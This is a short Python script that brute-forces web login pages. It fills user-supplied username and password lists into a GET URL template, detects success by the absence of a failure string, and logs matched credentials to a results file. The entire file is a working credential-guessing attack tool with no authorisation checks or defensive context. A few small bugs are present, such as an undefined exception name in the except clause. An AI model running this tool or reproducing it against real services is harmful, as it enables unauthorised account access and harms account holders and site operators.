import urllib3
import datetime

http = urllib3.PoolManager()

test_login = ''
test_password = ''
logins_for_email = input('Enter path to logins file: ')
passwords_for_email = input('Enter path to passwords file: ')
info = input('Currently, the script supports only the GET method. Click Enter to continue...')
path = input('Enter URL path, Instead of the login, enter "{}" and instead of the password, enter "{}".\nExample: http://adres_URL/Admin.php?Email={}@some_mail.com&Password={} - remember you cannot add any space before the URL or in the URL.\nEnter Your URL: ')
response_when_credentiale_failed = input('Enter compare strimg: ')
count_logins = 0
count_passwords = 0
item_to_check = 0

with open(logins_for_email, 'rb') as file:
    count_logins = len(file.readlines())
    file.close()

with open(passwords_for_email, 'rb') as file:
    count_passwords = len(file.readlines())
    file.close()

print(f'\nItems to check: {count_logins * count_passwords}.\n')

item_to_check = count_logins * count_passwords - 1

f = open("brute_force_email_results.txt", "a")
f.write(f'\n\n----------New scan {datetime.datetime.now().strftime("%m_%d_%Y_%H-%M-%S")}.----------\n')
f.close()

start = input('Click Enter to start...\n')

with open(logins_for_email, 'r') as file_logins:
    for login in file_logins:
        with open(passwords_for_email, 'r') as file_passwords:
            for password in file_passwords:
                try:
                    test_login = login.strip('\n')
                    test_password = password.strip('\n')
                    req = http.request('GET', path.format(test_login,test_password))
                    status = req.status
                    if response_when_credentiale_failed not in req.data.decode('utf-8'):
                        print(f'\nSUCCESS!!! Password is MATCHED. Status Code: {status}, for login: {test_login}, for password: {test_password}. Items left to check: {item_to_check}.\n')
                        f = open("brute_force_email_results.txt", "a")
                        f.write(f'\nSUCCESS!!! Password is MATCHED. Status Code: {status}, for login: {test_login}, for password: {test_password}\n')
                        f.close()
                    else:
                        print(f'Pasword WRONG. Status Code: {status}, for login: {test_login}, for password: {test_password}. Items left to check: {item_to_check}.')
                        f = open("brute_force_email_results.txt", "a")
                        f.write(f'Pasword WRONG. Status Code: {status}, for login: {test_login}, for password: {test_password}\n')
                        f.close()
                except err:
                    print(err)
                item_to_check -= 1
print(f'\nResults have been saved to  brute_force_email_results.txt file. Each next scan will be added to the same file.')
